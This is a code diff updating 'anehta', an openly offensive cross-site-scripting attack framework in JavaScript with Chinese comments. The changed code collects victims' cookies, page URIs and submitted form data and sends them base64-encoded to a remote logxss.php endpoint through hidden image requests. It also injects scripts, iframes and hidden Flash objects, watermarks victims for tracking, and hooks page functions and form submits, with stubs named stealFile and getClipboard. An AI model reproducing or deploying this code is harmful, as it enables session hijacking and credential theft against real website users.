@@ -4,7 +4,7 @@
 //// 定义常量
 //////////////////////////////////////////////////
 var anehta = {
-        version: '0.3.0',
+        version: '0.4.1',
         author: 'axis',
         contact: 'axis@ph4nt0m.org',
         homepage: 'http://www.ph4nt0m.org',
@@ -15,18 +15,20 @@ var isBaseLibLoaded = "true";
 var anehtaurl = "http://www.secwiki.com/anehta";
 var feedurl = anehtaurl+"/feed.js";
 var logurl = anehtaurl+"/logxss.php?";  // cookie 和 querystring 收集
+var watermarkflash = anehtaurl+"/module/flash/anehtaWatermark.swf";  // 客户端水印
 
 var NoCryptMark = "    [NoCryptMark]";
 var XssInfo_S = "    [**** ";
 var XssInfo_E = " ****]\r\n";
-var XssGotURI = XssInfo_S+"Request URI: "+escape(window.location.href)+XssInfo_E
-var XssGotCookie = XssInfo_S+"Cookie: "+escape(document.cookie)+XssInfo_E
+
 
 //////////////////////////////////////////////////
 //// 定义全局变量
 //////////////////////////////////////////////////
 var $d=document;
-var cache = new Object();
+
+
+ 
 
 //////////////////////////////////////////////////
 //// Core Library
@@ -45,9 +47,200 @@ anehta.core.freeze = function(time){
   } while(cur - date < time);
 };
 
-anehta.core.grep = function(str){
+/**
+ * idea from :jCache - A client cache plugin for jQuery
+ * Should come in handy when data needs to be cached in client to improve performance.
+ * Author: 	Phan Van An 
+ *			phoenixheart@gmail.com
+ *			http://www.skidvn.com
+ * License : Read jQuery's license
+
+Usage:
+    1. 	var cache = new anehta.core.cache();
+    2.	[OPTIONAL] Set the max cached item number, for example 20
+    	cache.maxSize = 20; 
+    3. 	Start playing around with it:
+    	- Put an item into cache: cache.setItem(theKey, the Value);
+    	- Retrieve an item from cache: var theValue = cache.getItem(theKey);
+    	- Empty the cache: cache.clear();
+    	- cache.removeItem(theKey);
+    	- cache.overwriteItem(theKey);
+    	- cache.dropItem(theKey);
+    	- cache.hasItem(theKey);
+    	- ...
+ */
+anehta.core.cache = function(){
+	this.version = 'anehta.core.cache v1';
 	
+	/**
+	 * The maximum items this cache should hold. 
+	 * If the cache is going to be overload, oldest item will be deleted (FIFO).
+	 * Since the cached object is retained inside browser's state, 
+	 * a too big value on a too big web apps may affect system memory.
+	 * Default is 10.
+	 */
+	this.maxSize = 30;
+	
+    /**
+     * An array to keep track of the cache keys
+     */
+	this.keys = new Array();
+	
+	/**
+	 * Number of currently cached items
+	 */
+	this.cache_length = 0;
+	
+	/**
+	 * An associated array to contain the cached items
+	 */
+	this.items = new Array();
+	
+	/*
+	 * @desc	Puts an item into the cache
+	 *
+	 * @param	string Key of the item
+	 * @param 	string Value of the item
+	 * @return	string Value of the item
+	 */
+	this.setItem = function(pKey, pValue)
+	{
+		if (typeof(pValue) != 'undefined') 
+		{
+			if (typeof(this.items[pKey]) == 'undefined') 
+			{
+				this.cache_length++;
+			}
+
+			this.keys.push(pKey);
+			this.items[pKey] = pValue;
+			
+			if (this.cache_length > this.maxSize)
+			{
+				this.removeOldestItem();
+			}
+		}
+	   
+		return pValue;
+	}
+	
+	/*
+	 * @desc	Removes an item from the cache using its key
+	 * @param 	string Key of the item
+	 */
+	 // 仅仅是把key对应的值删除,key的名字和占用的空间还是保留了
+	this.removeItem = function(pKey)
+	{
+		var tmp;
+		if (typeof(this.items[pKey]) != 'undefined') 
+		{
+			this.cache_length--;
+			tmp = this.items[pKey];
+			delete this.items[pKey];
+		}
+	   
+		return tmp;
+	}
+	
+	// 删除一个key和它占用的空间
+	this.dropItem = function(pKey){
+		if (typeof(this.items[pKey]) != 'undefined') 
+		{
+			var key_tmp1 = new Array();
+			var key_tmp2 = new Array();
+			
+			for(i=0; i<this.keys.length; i++){
+				if (this.keys[i] == pKey){ // 找到了, 删除中间的
+					//alert("matched!");
+					this.cache_length--;
+					delete this.items[pKey]; 
+					
+					key_tmp1 = this.keys.slice(0, i);
+					key_tmp2 = this.keys.slice(i+1);
+
+					this.key = key_tmp1.concat(key_tmp2);		
+				} 
+			}	
+			//alert("keys end: "+this.key);
+			return true;
+		}
+		return false;
+	}
+
+	/*
+	 * @desc 	Retrieves an item from the cache by its key
+	 *
+	 * @param 	string Key of the item
+	 * @return	string Value of the item
+	 */
+	this.getItem = function(pKey) 
+	{
+		return this.items[pKey];
+	}
+	
+	// removeItem()有问题，不能正常工作
+	this.overwriteItem = function(pKey, pValue)
+	{
+		if(this.hasItem(pKey) == true){ // 有则覆盖
+			this.items[pKey] = pValue; // 覆盖值
+		}
+		else { // 没有则添加
+			this.setItem(pKey, pValue);
+		} 
+	}
+	
+	//获取所有的key值; 包括被drop的，都会显示出来
+	this.showKeys = function() 
+	{
+		return this.keys;
+	}
+
+	/*
+	 * @desc	Indicates if the cache has an item specified by its key
+	 * @param 	string Key of the item
+	 * @return 	boolean TRUE or FALSE
+	 */
+	this.hasItem = function(pKey)
+	{
+		return typeof(this.items[pKey]) != 'undefined';
+	}
+	
+	/**
+	 * @desc	Removes the oldest cached item from the cache
+	 */
+	this.removeOldestItem = function()
+	{
+		this.removeItem(this.keys.shift());
+	}
+	
+	/**
+	 * @desc	Clears the cache
+	 * @return	Number of items cleared
+	 */
+	this.clear = function()
+	{
+		var tmp = this.cache_length;
+		this.keys = new Array();
+		this.cache_length = 0;
+		this.items = new Array();
+		return tmp;
+	}
 }
+
+// 初始化一个cache出来共享数据
+var anehtaCache = new anehta.core.cache();
+
+
+// Using Flash Shared Object to Store Watermark
+anehta.core.setWatermark = function(flashID, o){
+	return document.getElementById(flashID).setWatermark(o);	
+}
+
+// Get the info from flash
+anehta.core.getWatermark = function(flashID){		  		  
+	return document.getElementById(flashID).getWatermark();         
+}
+
 
 anehta.core.parseJSON = function(){
 	
@@ -56,6 +249,7 @@ anehta.core.parseJSON = function(){
 anehta.core.parseXML = function(){
 	
 }
+
 
 //////////////////////////////////////////////////
 //// DOM Library
@@ -70,21 +264,37 @@ anehta.dom.unbindEvent = function (){
 	
 }
 
-anehta.dom.getDocument = function (){
-	
+// from attackAPI
+anehta.dom.getDocument = function (target){
+	var doc = null;
+    
+  if (target == undefined) {
+    doc = document;
+  } else if (target.contentDocument) {
+           doc  = target.contentDocument;
+         } else if (target.contentWindow) {
+                  doc = target.contentWindow.document;
+                } else if (target.document) {
+                         doc = target.document;
+                       }        
+  return doc;
 }
 
-// 添加一个cookie
+// 添加一个cookie; 需要cookie名事先不存在. 如果是更改cookie的值请用setCookie
 anehta.dom.addCookie = function (cookieName, cookieValue){
-	try{
-		if (cookieValue != null){
-	    $d.cookie = cookieName + "=" + cookieValue + "\; " + $d.cookie;
-	  } else {
-	  	$d.cookie = cookieName + "\; " + $d.cookie; // 不需要"="
+	// 为了和setCookie有所分别
+	if (anehta.dom.checkCookie(cookieName) == true){
+		return false; 
+	}
+  if (cookieValue != null){
+    $d.cookie = cookieName + "=" + cookieValue + "\;" + $d.cookie;
+	} else 
+		if (cookieName != undefined){
+		  //alert("now: "+$d.cookie +" cookieName: "+cookieName);
+	    $d.cookie = cookieName + "\;" + $d.cookie; // 不需要"="
+	    //alert($d.cookie);
 	  }
-  } catch (e){
-  	//alert(e);
-  }
+	return true;  
 }
 
 // 检查cookie是否存在,不取值
@@ -142,19 +352,99 @@ anehta.dom.getCookie = function (cookieName){
 	}
 }
 
-
+// 设置某个cookie的值;需要该cookie存在，否则返回false
 anehta.dom.setCookie = function (cookieName, cookieValue){
+	var cookies = $d.cookie.split(';');
+	var single_cookie;
+	var newcookies = new Array();
+	var ret = false; // 若是没有找到cookieName 则返回false
 	
+	for (i=0; i<cookies.length; i++){
+		if (cookies[i].indexOf("=")<0){ //没有"="的情况
+			if (cookies[i] == cookieName){
+				newcookies[i]=cookies[i] + "=" + cookieValue + ";";
+				ret = true;
+			} else {
+			  newcookies[i]=cookies[i] + ";";
+		  }
+		}
+		else {
+			single_cookie = cookies[i].split('=');
+		
+		  if ($.trim(single_cookie[0]) == cookieName){
+			  //alert("matched! "+cookies[i]);
+			  newcookies[i] = single_cookie[0] + "=" + cookieValue + ";";
+			  ret = true;
+		  } else{
+		    newcookies[i]=cookies[i] + ";";
+		  }
+	  }
+		$d.cookie = newcookies[i]; // 改变cookie的值
+	}
+	//alert(newcookies);
+	return ret;
 }
 
-anehta.dom.delCookie = function (){
-	
+// 实际上只能expire cookie
+anehta.dom.delCookie = function (cookieName){
+	if (anehta.dom.checkCookie(cookieName) == false){
+		return false; 
+	}
+		
+  var exp = new Date();
+  try{
+    document.cookie = cookieName + "=" + anehta.dom.getCookie(cookieName) + 
+                      ";" + "expires=" + exp.toGMTString() + ";" + ";";
+  } catch (e){
+  	return false;
+  }
+  //alert(document.cookie);
+  return true;
 }
+
+// 让一个cookie不过期
+anehta.dom.persistCookie = function(cookieName){
+	if (anehta.dom.checkCookie(cookieName) == false){
+		return false; 
+	}
+	
+	try{
+    document.cookie = cookieName + "=" + anehta.dom.getCookie(cookieName) + 
+                      ";" + "expires=Thu, 01-Jan-2038 00:00:01 GMT;";
+  } catch (e){
+  	return false;
+  }
+	return true;
+}
+
+// 取当前URI中某个参数的值
+anehta.dom.getQuerystr = function(QueryStrName){
+	var queryStr;
+	var queryStr_temp;
+	queryStr = window.location.href.substr(window.location.href.indexOf("?")+1).split('&');
+	
+	for (i=0; i<queryStr.length; i++){
+		queryStr_temp = queryStr[i].split('=');
+		if (queryStr_temp[0] == QueryStrName){ // 找到了
+			return queryStr_temp[1]; // 返回值
+		}		
+	}
+	return null; // 否则返回空
+}
+
 
 //////////////////////////////////////////////////
 //// Net Library
 //////////////////////////////////////////////////
 anehta.net = {};
+
+// get 请求
+anehta.net.getURL = function(s){
+	var image = new Image();
+	image.style.width = 0;
+	image.style.height = 0;
+	image.src = s;
+}
 
 // 提交表单  
 anehta.net.postForm = function(url){
@@ -167,27 +457,23 @@ anehta.net.postForm = function(url){
 	f.submit();
 }
 
-// img get 请求
-anehta.net.getURL = function(s){
-	var image = new Image();
-	image.style.width = 0;
-	image.style.height = 0;
-	image.src = s;
-}
-
 //////////////////////////////////////////////////
 //// Logger Library
 //////////////////////////////////////////////////
 anehta.logger = {};
 
 anehta.logger.logInfo = function(param){
-	param = XssInfo_S + "Info: " + param +XssInfo_E;
+	param = NoCryptMark + XssInfo_S + "Watermark: " + anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
+	        XssInfo_S + "Info: " + param +XssInfo_E;
 	param = escape(param);
-	anehta.net.getURL(logurl+param)
+	anehta.net.getURL(logurl+param);
 }
 
 anehta.logger.logCookie = function(){
-	var param = XssGotURI+XssGotCookie;  // 传递回server的参数
+	var param = XssInfo_S + "Watermark: " + anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
+	            XssInfo_S+"Request URI: "+escape(window.location.href)+XssInfo_E+ // 获取当前URI
+              XssInfo_S+"Cookie: "+escape(document.cookie)+XssInfo_E ;  //获取当前cookie
+	
   param = anehta.crypto.base64encode(param); // base64 加密参数传输; 使用base64加密对性能影响很大
   //alert(param);
   // 发送cookie 和 uri 回 server
@@ -217,7 +503,8 @@ anehta.logger.logForm = function(o) {
 	}
 	
 	// 记录提交的参数到远程服务器
-	param = XssInfo_S + "Form Sniffer: " + escape(param) + XssInfo_E;
+	param = XssInfo_S + "Watermark: " + anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
+	        XssInfo_S + "Form Sniffer: " + escape(param) + XssInfo_E;
 	param = anehta.crypto.base64encode(param); //base64时候对时间影响太大,会导致还没发包就页面跳转,从而出错
 	//alert(param);
 	
@@ -228,8 +515,7 @@ anehta.logger.logForm = function(o) {
 	img.src = logurl+param;
 	
 	// 需要冻结一段时间保证getURL成功完成
-	anehta.core.freeze(300);
-	
+	anehta.core.freeze(300);	
 	//return false;
 } 
 
@@ -238,6 +524,7 @@ anehta.logger.logForm = function(o) {
 // Ajax Library 
 //////////////////////////////////////////////////
 anehta.ajax = {};
+
 /*
 * XmlHttp 类
 */
@@ -332,6 +619,8 @@ anehta.ajax.XmlHttp = function() {
 				o.open("GET", url, true);
 				setRequestHeaders(headers);
 				o.onreadystatechange = function() { readyStateChange(processResponse); };
+				// 自动带上当前cookie
+				o.setRequestHeader("Cookie", document.cookie);
 				o.send();
 				return true;
 			} catch (ex) {
@@ -361,8 +650,11 @@ anehta.ajax.XmlHttp = function() {
 				o.onreadystatechange = function() { readyStateChange(processResponse); };
 				o.setRequestHeader("Content-Length", data.length);
 				o.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+				// 自动带上当前cookie; 在firefox中正常,IE中设置不了
+				o.setRequestHeader("Cookie", document.cookie);
 				o.send(data);
 				return true;
+				//return processResponse;
 			} catch (ex) {
 				return false;
 			}
@@ -387,33 +679,42 @@ if (xmlhttp.init()) {
 }
 */
 
-// 初始化
+// 初始化AJAX
 var xmlhttp = new anehta.ajax.XmlHttp();
 
-
-// 重新封装POST/GET
+// 重新封装POST/GET  返回数据写在cache中
+/*
+* anehtaCache.getItem("ajaxPostResponseHeaders"));
+* anehtaCache.getItem("ajaxPostResponse"));
+* anehtaCache.hasItem("ajaxPostResponse"));
+*/
 anehta.ajax.post = function(url, param){ 
   // 第二个参数是提交的参数,第三个参数是headers
 	xmlhttp.post(url, param, null, function(response, responseHeaders) {
 		 if (responseHeaders != null) {
 			 //alert(responseHeaders);
+			 anehtaCache.overwriteItem("ajaxPostResponseHeaders", responseHeaders);
 		 }
     
 		 if (response != null) {
 			 //alert(response);
+			 anehtaCache.overwriteItem("ajaxPostResponse", response);
 		 }		    
 	 });
 }
  
+// 针对IE可用,FF不行
 anehta.ajax.get = function(url){
   // 第二个参数是headers
 	xmlhttp.get(url, null, function(response, responseHeaders) {
 		if (responseHeaders != null) {
 			//alert(responseHeaders);
+			anehtaCache.overwriteItem("ajaxGetResponseHeaders", responseHeaders);
 		}
     
 		if (response != null) {
 			//alert(response);
+			anehtaCache.overwriteItem("ajaxGetResponse", response);
 		}
 	});
 } 
@@ -424,14 +725,30 @@ anehta.ajax.get = function(url){
 //////////////////////////////////////////////////
 anehta.inject = {};
 
-anehta.inject.InjectScript = function(ptr_sc){
-    s=document.createElement("script");
-    s.src=ptr_sc;
-    document.getElementsByTagName("body")[0].appendChild(s);
+anehta.inject.injectScript = function(ptr_sc){
+  s=document.createElement("script");
+  s.src=ptr_sc;
+  document.getElementsByTagName("body")[0].appendChild(s);
+  return s;
 }
 
+anehta.inject.removeScript = function(ptr_sc){
+	/*
+	var ob = $d.getElementsByTagName("body")[0].childNodes;
+	for (i=0; i<ob.length; i++){
+	  
+	  if (ob[i].src == ptr_sc){
+	  	alert("matched!! "+ob[i].src);
+	  	ob[i].removeAttribute("src");
+	  	 // $d.getElementsByTagName("body")[0].removeChild($d.getElementsByTagName("body")[0].childNodes[i]);
+	  	//$('script').filter(function(){this.src=ptr_sc;})
+	  	alert("after remove: "+ob[i].src);
+	  }
+  }
+  */
+}
 
-anehta.inject.AddScript = function(ptr_sc){
+anehta.inject.addScript = function(ptr_sc){
     document.write("<script src='"+ptr_sc+"'></script>");
 }
 
@@ -460,18 +777,20 @@ anehta.inject.injectIframe = function(remoteurl) {
 	return newIframe;	
 }
 
-anehta.inject.injectFlash = function() {
-	
+anehta.inject.injectFlash = function(flashId, flashSrc, flashParam) {
+	//flashParam = '?' + flashParam;
+	document.write('<object type="application/x-shockwave-flash" data="' + flashSrc +
+	         '" width="0" height="0" id="' + flashId +
+	         '"><param name="allowScriptAccess" value="always" /> ' +
+	         '<param name="movie" value="' + flashSrc + '" />' +
+	         '<PARAM NAME=FlashVars VALUE="domainAllowed=' + flashParam + '" />' +
+	         '<param name="bgColor" value="#fff" /> </object>');	
 }
 
 anehta.inject.injectApplet = function() {
 	
 }
 
-
-//////////////////////////////////////////////////
-//// Hook Library
-//////////////////////////////////////////////////
 /* 一般JS函数的hook, 使用委托
    @axis
    注意hook函数加载前,如果函数已经调用了,则该函数无法hook 
@@ -486,9 +805,7 @@ anehta.inject.injectApplet = function() {
    //可以递归注入函数,不能劫持参数
    hj.injectFn("被inject的函数名", "保存原函数的变量", "你的函数名");
 */
-anehta.hooklib = {};
-
-anehta.hooklib.hookFn = function (){
+anehta.inject.hookFunction = function (){
 	//alert("hookjsfunc");
   // 保存原函数;还是需要作为参数指定一个,
   //否则多次hook后会丢失之前保存的原函数
@@ -565,6 +882,8 @@ anehta.hooklib.hookFn = function (){
 	};	
 };
 
+// 初始化hook
+var anehtaHook = new anehta.inject.hookFunction();
 
 /*
 * Name: hookSubmit 
@@ -575,7 +894,7 @@ anehta.hooklib.hookFn = function (){
 *
 * If the form uses javascript to call submit method for submitting, you should install a hook on the form.
 */
-anehta.hooklib.hookSubmit = function(o, injectFuncCallBack) {
+anehta.inject.hookSubmit = function(o, injectFuncCallBack) {
 	//alert();
 	if (o.hooked == undefined) {
 		o.hooked = true;
@@ -589,6 +908,8 @@ anehta.hooklib.hookSubmit = function(o, injectFuncCallBack) {
 		}
 	}
 }
+
+
 
 //////////////////////////////////////////////////
 //// Detect Library
@@ -617,28 +938,80 @@ anehta.detect.browser = function (){
 	};
 };
 
+// 先判断浏览器版本 $.browser.msie/safari/opera/mozilla
+var anehtaBrowser = new anehta.detect.browser();
 
-anehta.detect.flash = function (){
+// 跨浏览器检查某个版本的flash是否支持
+// anehta.detect.flash("8"); 支持返回true,不支持返回false
+// 执行完后，flash版本被保存到 anehtaCache的 FlashVer 中
+anehta.detect.flash = function(targetVersion){
+	var FlashDetector_Version;
+	var playable = false;
+	
+	if (anehtaBrowser.type() == "msie" || anehtaBrowser.type() == "opera"){
+		try {
+			FlashDetector_Version = "ShockwaveFlash.ShockwaveFlash." + targetVersion;
+		  FlashObj = new ActiveXObject(FlashDetector_Version);
+		  anehtaCache.overwriteItem("FlashVer", FlashDetector_Version); // 保存到cache中		  
+		  playable = true;
+		} catch (e){
+			return playable;
+		}
+	} 
+	else if (anehtaBrowser.type() == "mozilla"){
+	  var pObj = null;
+	  var tokens, len, curr_tok;
+	  var hasVersion = -1;
+	  
+	  if(navigator.mimeTypes && navigator.mimeTypes['application/x-shockwave-flash'])
+	  {
+	    pObj = navigator.mimeTypes['application/x-shockwave-flash'].enabledPlugin;
+	  }
+	  if(pObj != null)
+	  {
+	    tokens = navigator.plugins['Shockwave Flash'].description.split(' ');
+	    len = tokens.length;
+	    while(len--)
+	    {
+	  	  curr_tok = tokens[len];
+	  	  if(!isNaN(parseInt(curr_tok)))
+	  	  {
+	  	    hasVersion = curr_tok;
+	  	    FlashDetector_Version = curr_tok;  // flash版本
+	  	    anehtaCache.setItem("FlashVer", FlashDetector_Version); // 保存到cache中
+	  	    break;
+	  	  }
+	    }
+	    if(hasVersion >= targetVersion)
+	    {
+	  	  playable = true;
+	    }
+	    else
+	    {
+	  	  playable = false;
+	    }
+	  }
+  }
+  return playable;
+};
+
+anehta.detect.java = function(){
 
 }
 
-anehta.detect.java = function (){
+anehta.detect.internalIP = function(){
 
 }
 
-anehta.detect.internalIP = function (){
+anehta.detect.hostname = function(){
 
 }
 
-anehta.detect.hostname = function (){
-
-}
-
-anehta.detect.httponly = function (){
+anehta.detect.httponly = function(){
 	
 }
 
-anehta.detect.activex = function (){
+anehta.detect.activex = function(){
 	
 }
 
@@ -675,6 +1048,29 @@ anehta.scanner.online = function(){
 anehta.scanner.ping = function(){
 	
 }
+
+anehta.scanner.localfile = function(){
+	
+}
+
+//////////////////////////////////////////////////
+// Miscellaneous Library
+//////////////////////////////////////////////////
+anehta.misc = {};
+
+anehta.misc.stealFile = function(){
+	
+}
+
+anehta.misc.getClipboard = function(){
+	
+}
+
+anehta.misc.setClipboard = function(){
+	
+}
+
+
 
 //////////////////////////////////////////////////
 // Crypto Library
@@ -779,6 +1175,15 @@ anehta.crypto.base64decode = function(str) {
     }
     return out;
 }
+
+
+//////////////////////////////////////////////////
+// jQuery Extend Plugin
+//////////////////////////////////////////////////
+
+
+
+
 
 
 //////////////////////////////////////////////////
